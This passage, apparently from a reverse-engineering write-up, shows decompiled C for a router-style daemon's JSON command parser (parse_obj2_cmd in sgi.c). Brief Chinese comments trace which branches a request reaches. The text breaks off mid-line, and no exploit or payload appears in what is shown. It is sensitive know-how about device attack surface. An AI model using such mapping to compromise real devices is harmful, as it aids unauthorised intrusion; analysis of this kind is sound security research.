class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">parse_obj2_cmd</span><span class="params">(<span class="type">int</span> json, <span class="type">int</span> string_0)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> ptr; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> ptr_2; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">int</span> method_1; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> method_2; <span class="comment">// $s2</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v8; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> method_string_1; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v14; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> method_string; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// $s2</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v19; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> <span class="built_in">string</span>; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v21; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v22; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v23; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">bool</span> v24; <span class="comment">// dc</span></span><br><span class="line">  _BYTE *v25; <span class="comment">// $v0</span></span><br><span class="line">  _BYTE *v26; <span class="comment">// $s2</span></span><br><span class="line">  _BYTE *v27; <span class="comment">// $v0</span></span><br><span class="line">  _BYTE *v28; <span class="comment">// $s2</span></span><br><span class="line">  _BYTE *v29; <span class="comment">// $v0</span></span><br><span class="line">  _BYTE *v30; <span class="comment">// $s2</span></span><br><span class="line">  _BYTE *v31; <span class="comment">// $v0</span></span><br><span class="line">  _BYTE *v32; <span class="comment">// $s2</span></span><br><span class="line">  _BYTE *v33; <span class="comment">// $v0</span></span><br><span class="line">  _BYTE *v34; <span class="comment">// $s2</span></span><br><span class="line">  _BYTE *v35; <span class="comment">// $v0</span></span><br><span class="line">  _BYTE *v36; <span class="comment">// $s2</span></span><br><span class="line">  _BYTE *v37; <span class="comment">// $v0</span></span><br><span class="line">  _BYTE *v38; <span class="comment">// $s2</span></span><br><span class="line">  _BYTE *v39; <span class="comment">// $v0</span></span><br><span class="line">  _BYTE *v40; <span class="comment">// $s2</span></span><br><span class="line">  <span class="type">int</span> v41; <span class="comment">// $s1</span></span><br><span class="line">  <span class="type">int</span> v42; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v43; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> params_module; <span class="comment">// [sp+20h] [-Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> params; <span class="comment">// [sp+24h] [-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  ptr = <span class="built_in">malloc</span>(<span class="number">52</span>);</span><br><span class="line">  ptr_2 = ptr;</span><br><span class="line">  <span class="keyword">if</span> ( !ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)memory is full!&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;parse_obj2_cmd&quot;</span>, <span class="number">276</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memset</span>(ptr, <span class="number">0</span>, <span class="number">52</span>);</span><br><span class="line">  <span class="keyword">if</span> ( string_0 )</span><br><span class="line">    *(_DWORD *)(ptr_2 + <span class="number">16</span>) = strdup(string_0);</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(json, <span class="string">&quot;module&quot;</span>, &amp;params_module) != <span class="number">1</span></span><br><span class="line">    || (method_1 = json_object_get_string(params_module), (method_2 = method_1) == <span class="number">0</span>)</span><br><span class="line">    || <span class="built_in">strcmp</span>(method_1, <span class="string">&quot;esw&quot;</span>) )                <span class="comment">// 显然进入</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( json_object_object_get_ex(json, <span class="string">&quot;method&quot;</span>, &amp;params_module) != <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)obj_method is null&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;parse_obj2_cmd&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_129;</span><br><span class="line">    &#125;</span><br><span class="line">    method_string = json_object_get_string(params_module);</span><br><span class="line">    v16 = method_string;</span><br><span class="line">    <span class="keyword">if</span> ( !method_string )</span><br><span class="line">    &#123;</span><br><span class="line">      uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)s_method is null&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;parse_obj2_cmd&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_129;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strstr</span>(method_string, <span class="string">&quot;devSta&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v17 = <span class="number">2</span>;                                  <span class="comment">// 成立</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strstr</span>(v16, <span class="string">&quot;acConfig&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        *(_DWORD *)ptr_2 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_46;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strstr</span>(v16, <span class="string">&quot;devConfig&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        *(_DWORD *)ptr_2 = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_46;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strstr</span>(v16, <span class="string">&quot;devCap&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        v17 = <span class="number">3</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !<span class="built_in">strstr</span>(v16, <span class="string">&quot;ufSys&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          uf_log_printf(uf_log, (<span class="type">const</span> <span class="type">char</span> *)dword_41FA70, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;parse_obj2_cmd&quot;</span>);</span><br><span class="line">LABEL_46:</span><br><span class="line">          v18 = <span class="built_in">strchr</span>(v16, <span class="number">46</span>);</span><br><span class="line">          v19 = strdup(v18 + <span class="number">1</span>);</span><br><span class="line">          *(_DWORD *)(ptr_2 + <span class="number">4</span>) = v19;</span><br><span class="line">          <span class="keyword">if</span> ( !v19 )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_128;</span><br><span class="line">          <span class="keyword">if</span> ( json_object_object_get_ex(json, <span class="string">&quot;params&quot;</span>, &amp;params) == <span class="number">1</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( json_object_object_get_ex(params, <span class="string">&quot;module&quot;</span>, &amp;params_module) == <span class="number">1</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="built_in">string</span> = json_object_get_string(params_module);</span><br><span class="line">              <span class="keyword">if</span> ( <span class="built_in">string</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                v21 = strdup(<span class="built_in">string</span>);</span><br><span class="line">                *(_DWORD *)(ptr_2 + <span class="number">8</span>) = v21;</span><br><span class="line">                <span class="keyword">if</span> ( v21 )</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="keyword">if</span> ( json_object_object_get_ex(params, <span class="string">&quot;remoteIp&quot;</span>, &amp;params_module) != <span class="number">1</span></span><br><span class="line">                    || (<span class="type">unsigned</span> <span class="type">int</span>)(json_object_get_type(params_module) - <span class="number">5</span>) &gt;= <span class="number">2</span> )</span><br><span class="line">                  &#123;</span><br><span class="line">                    *(_DWORD *)(ptr_2 + <span class="number">20</span>) = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">goto</span> LABEL_59;</span><br><span class="line">                  &#125;</span><br><span class="line">                  v22 = json_object_get_string(params_module);</span><br><span class="line">                  <span class="keyword">if</span> ( !v22 )</span><br><span class="line">                    <span class="keyword">goto</span> LABEL_59;</span><br><span class="line">                  v23 = strdup(v22);</span><br><span class="line">                  *(_DWORD *)(ptr_2 + <span class="number">20</span>) = v23;</span><br><span class="line">                  <span class="keyword">if</span> ( v23 )</span><br><span class="line">                    <span class="keyword">goto</span> LABEL_59;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">goto</span> LABEL_128;</span><br><span class="line">              &#125;</span><br><span class="line">              uf_log_printf(uf_client_log, <span class="string">&quot;(%s %s %d)obj_module is null&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;parse_obj2_cmd&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)obj_module is null&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;parse_obj2_cmd&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            uf_log_printf(uf_log, <span class="string">&quot;ERROR (%s %s %d)params is null&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;parse_obj2_cmd&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">LABEL_129:</span><br><span class="line">          cmd_msg_free(ptr_2);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        v17 = <span class="number">4</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    *(_DWORD *)ptr_2 = v17;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_46;</span><br><span class="line">  &#125;                                             <span class="comment">// end</span></span><br><span class="line">  v8 = (<span class="type">const</span> <span class="type">char</span> *)strdup(method_2);</span><br><span class="line">  *(_DWORD *)(ptr_2 + <span class="number">8</span>) = v8;</span><br><span class="line">  <span class="keyword">if</span> ( !v8 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_128;</span><br><span class="line">  <span class="keyword">if</span> ( g_debug &gt;= <span class="number">3</span> )</span><br><span class="line">    uf_log_printf(uf_log, <span class="string">&quot;(%s %s %d)cmd_msg-&gt;module:%s&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;parse_obj2_cmd&quot;</span>, <span class="number">295</span>, v8);</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(json, <span class="string">&quot;url&quot;</span>, &amp;params_module) == <span class="number">1</span> )<span class="comment">// 无</span></span><br><span class="line">  &#123;</span><br><span class="line">    v9 = json_object_get_string(params_module);</span><br><span class="line">    <span class="keyword">if</span> ( v9 )</span><br><span class="line">    &#123;</span><br><span class="line">      v10 = strdup(v9);</span><br><span class="line">      *(_DWORD *)(ptr_2 + <span class="number">28</span>) = v10;</span><br><span class="line">      <span class="keyword">if</span> ( !v10 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_128;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( g_debug &gt;= <span class="number">3</span> )</span><br><span class="line">      uf_log_printf(</span><br><span class="line">        uf_log,</span><br><span class="line">        <span class="string">&quot;(%s %s %d)cmd_msg-&gt;url_str:%s&quot;</span>,</span><br><span class="line">        <span class="string">&quot;sgi.c&quot;</span>,</span><br><span class="line">        <span class="string">&quot;parse_obj2_cmd&quot;</span>,</span><br><span class="line">        <span class="number">306</span>,</span><br><span class="line">        *(<span class="type">const</span> <span class="type">char</span> **)(ptr_2 + <span class="number">28</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(json, <span class="string">&quot;sn&quot;</span>, &amp;params_module) == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v11 = json_object_get_string(params_module);</span><br><span class="line">    <span class="keyword">if</span> ( v11 )</span><br><span class="line">    &#123;</span><br><span class="line">      v12 = strdup(v11);</span><br><span class="line">      *(_DWORD *)(ptr_2 + <span class="number">32</span>) = v12;</span><br><span class="line">      <span class="keyword">if</span> ( !v12 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_128;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( g_debug &gt;= <span class="number">3</span> )</span><br><span class="line">      uf_log_printf(uf_log, <span class="string">&quot;(%s %s %d)cmd_msg-&gt;sn:%s&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;parse_obj2_cmd&quot;</span>, <span class="number">318</span>, *(<span class="type">const</span> <span class="type">char</span> **)(ptr_2 + <span class="number">32</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(json, <span class="string">&quot;ip&quot;</span>, &amp;params_module) != <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_28;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)(json_object_get_type(params_module) - <span class="number">5</span>) &gt;= <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)(ptr_2 + <span class="number">20</span>) = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_28;</span><br><span class="line">  &#125;</span><br><span class="line">  method_string_1 = json_object_get_string(params_module);</span><br><span class="line">  <span class="keyword">if</span> ( method_string_1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v14 = (<span class="type">const</span> <span class="type">char</span> *)strdup(method_string_1);</span><br><span class="line">    *(_DWORD *)(ptr_2 + <span class="number">20</span>) = v14;</span><br><span class="line">    <span class="keyword">if</span> ( v14 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( g_debug &gt;= <span class="number">3</span> )</span><br><span class="line">        uf_log_printf(uf_log, <span class="string">&quot;(%s %s %d)cmd_msg-&gt;ip:%s&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;parse_obj2_cmd&quot;</span>, <span class="number">333</span>, v14);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_28;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_128:</span><br><span class="line">    uf_log_printf(uf_client_log, <span class="string">&quot;(%s %s %d)strdup failed!&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;parse_obj2_cmd&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_129;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_28:</span><br><span class="line">  *(_DWORD *)ptr_2 = <span class="number">5</span>;</span><br><span class="line">  *(_DWORD *)(ptr_2 + <span class="number">4</span>) = strdup(<span class="string">&quot;get&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( g_debug &gt;= <span class="number">3</span> )</span><br><span class="line">    uf_log_printf(uf_log, <span class="string">&quot;(%s %s %d)cmd_msg-&gt;ctype:%d&quot;</span>, <span class="string">&quot;sgi.c&quot;</span>, <span class="string">&quot;parse_obj2_cmd&quot;</span>, <span class="number">339</span>, <span class="number">5</span>);</span><br><span class="line">LABEL_59:</span><br><span class="line">  v24 = *(_DWORD *)ptr_2 != <span class="number">2</span>;</span><br><span class="line">  *(_BYTE *)(ptr_2 + <span class="number">40</span>) = <span class="number">0</span>;</span><br><span class="line">  *(_BYTE *)(ptr_2 + <span class="number">41</span>) = v24;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(params, <span class="string">&quot;async&quot;</span>, &amp;params_module) == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v25 = (_BYTE *)sub_40486C(params_module);</span><br><span class="line">    v26 = v25;</span><br><span class="line">    <span class="keyword">if</span> ( v25 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *v25 == <span class="number">48</span> || !<span class="built_in">strcmp</span>(v25, <span class="string">&quot;false&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        *(_BYTE *)(ptr_2 + <span class="number">40</span>) = <span class="number">1</span>;</span><br><span class="line">        *(_BYTE *)(ptr_2 + <span class="number">41</span>) = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( *v26 == <span class="number">49</span> || !<span class="built_in">strcmp</span>(v26, <span class="string">&quot;true&quot;</span>) )</span><br><span class="line">        *(_WORD *)(ptr_2 + <span class="number">40</span>) = <span class="number">1</span>;</span><br><span class="line">      <span class="built_in">free</span>(v26);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(params, <span class="string">&quot;force&quot;</span>, &amp;params_module) == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v27 = (_BYTE *)sub_40486C(params_module);</span><br><span class="line">    v28 = v27;</span><br><span class="line">    <span class="keyword">if</span> ( v27 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *v27 == <span class="number">49</span> || !<span class="built_in">strcmp</span>(v27, <span class="string">&quot;true&quot;</span>) )</span><br><span class="line">        *(_BYTE *)(ptr_2 + <span class="number">43</span>) = <span class="number">1</span>;</span><br><span class="line">      <span class="built_in">free</span>(v28);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(params, <span class="string">&quot;configId_not_change&quot;</span>, &amp;params_module) == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v29 = (_BYTE *)sub_40486C(params_module);</span><br><span class="line">    v30 = v29;</span><br><span class="line">    <span class="keyword">if</span> ( v29 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *v29 == <span class="number">49</span> || !<span class="built_in">strcmp</span>(v29, <span class="string">&quot;true&quot;</span>) )</span><br><span class="line">        *(_BYTE *)(ptr_2 + <span class="number">44</span>) = <span class="number">1</span>;</span><br><span class="line">      <span class="built_in">free</span>(v30);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( g_debug &gt;= <span class="number">2</span> )</span><br><span class="line">      uf_log_printf(</span><br><span class="line">        uf_log,</span><br><span class="line">        <span class="string">&quot;(%s %s %d)----------configId_not_change:%d&quot;</span>,</span><br><span class="line">        <span class="string">&quot;sgi.c&quot;</span>,</span><br><span class="line">        <span class="string">&quot;parse_obj2_cmd&quot;</span>,</span><br><span class="line">        <span class="number">481</span>,</span><br><span class="line">        *(<span class="type">unsigned</span> __int8 *)(ptr_2 + <span class="number">44</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(params, <span class="string">&quot;buf&quot;</span>, &amp;params_module) == <span class="number">1</span> )</span><br><span class="line">    *(_DWORD *)(ptr_2 + <span class="number">36</span>) = json_object_get_int(params_module);</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(params, <span class="string">&quot;from_url&quot;</span>, &amp;params_module) == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v31 = (_BYTE *)sub_40486C(params_module);</span><br><span class="line">    v32 = v31;</span><br><span class="line">    <span class="keyword">if</span> ( v31 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *v31 == <span class="number">49</span> || !<span class="built_in">strcmp</span>(v31, <span class="string">&quot;true&quot;</span>) )</span><br><span class="line">        *(_BYTE *)(ptr_2 + <span class="number">45</span>) = <span class="number">1</span>;</span><br><span class="line">      <span class="built_in">free</span>(v32);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( g_debug &gt;= <span class="number">2</span> )</span><br><span class="line">      uf_log_printf(</span><br><span class="line">        uf_log,</span><br><span class="line">        <span class="string">&quot;(%s %s %d)----------from_url:%d&quot;</span>,</span><br><span class="line">        <span class="string">&quot;sgi.c&quot;</span>,</span><br><span class="line">        <span class="string">&quot;parse_obj2_cmd&quot;</span>,</span><br><span class="line">        <span class="number">500</span>,</span><br><span class="line">        *(<span class="type">unsigned</span> __int8 *)(ptr_2 + <span class="number">45</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(params, <span class="string">&quot;from_file&quot;</span>, &amp;params_module) == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v33 = (_BYTE *)sub_40486C(params_module);</span><br><span class="line">    v34 = v33;</span><br><span class="line">    <span class="keyword">if</span> ( v33 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *v33 == <span class="number">49</span> || !<span class="built_in">strcmp</span>(v33, <span class="string">&quot;true&quot;</span>) )</span><br><span class="line">        *(_BYTE *)(ptr_2 + <span class="number">47</span>) = <span class="number">1</span>;</span><br><span class="line">      <span class="built_in">free</span>(v34);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( g_debug &gt;= <span class="number">2</span> )</span><br><span class="line">      uf_log_printf(</span><br><span class="line">        uf_log,</span><br><span class="line">        <span class="string">&quot;(%s %s %d)----------from_file:%d&quot;</span>,</span><br><span class="line">        <span class="string">&quot;sgi.c&quot;</span>,</span><br><span class="line">        <span class="string">&quot;parse_obj2_cmd&quot;</span>,</span><br><span class="line">        <span class="number">513</span>,</span><br><span class="line">        *(<span class="type">unsigned</span> __int8 *)(ptr_2 + <span class="number">47</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(params, <span class="string">&quot;multi&quot;</span>, &amp;params_module) == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v35 = (_BYTE *)sub_40486C(params_module);</span><br><span class="line">    v36 = v35;</span><br><span class="line">    <span class="keyword">if</span> ( v35 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *v35 == <span class="number">49</span> || !<span class="built_in">strcmp</span>(v35, <span class="string">&quot;true&quot;</span>) )</span><br><span class="line">        *(_BYTE *)(ptr_2 + <span class="number">48</span>) = <span class="number">1</span>;</span><br><span class="line">      <span class="built_in">free</span>(v36);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( g_debug &gt;= <span class="number">2</span> )</span><br><span class="line">      uf_log_printf(</span><br><span class="line">        uf_log,</span><br><span class="line">        <span class="string">&quot;(%s %s %d)----------multi:%d&quot;</span>,</span><br><span class="line">        <span class="string">&quot;sgi.c&quot;</span>,</span><br><span class="line">        <span class="string">&quot;parse_obj2_cmd&quot;</span>,</span><br><span class="line">        <span class="number">526</span>,</span><br><span class="line">        *(<span class="type">unsigned</span> __int8 *)(ptr_2 + <span class="number">48</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( json_object_object_get_ex(params, <span class="string">&quot;not_commit&quot;</span>, &amp;params_module) == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v37 = (_BYTE *)sub_40486C(params_module);</span><br><span class="line">    v38 = v37;</span><br><span class="line">    <span class="keyword">if</span> ( v37 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *v37 